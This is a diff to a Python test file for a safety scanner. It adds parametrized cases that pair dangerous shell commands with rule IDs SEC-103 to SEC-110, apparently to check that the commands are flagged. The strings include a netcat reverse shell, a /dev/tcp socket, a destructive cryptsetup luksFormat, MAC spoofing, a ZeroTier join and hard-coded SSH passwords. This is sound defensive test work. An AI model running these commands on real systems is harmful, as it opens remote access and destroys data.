@@ -227,6 +227,11 @@ class TestSafetyChecks:
             ("ssh-keygen -t rsa -f /tmp/key\n", "SEC-103"),
             ("nc -e /bin/sh 192.168.1.1 4444\n", "SEC-104"),
             ("exec 3<>/dev/tcp/192.168.1.1/4444\n", "SEC-105"),
+            ("cryptsetup luksFormat /dev/sdb1\n", "SEC-106"),
+            ("zerotier-cli join 1234abcd\n", "SEC-107"),
+            ("ip link set eth0 address 00:11:22:33:44:55\n", "SEC-108"),
+            ("sshpass -p password ssh user@host\n", "SEC-109"),
+            ("expect send password\n", "SEC-110"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
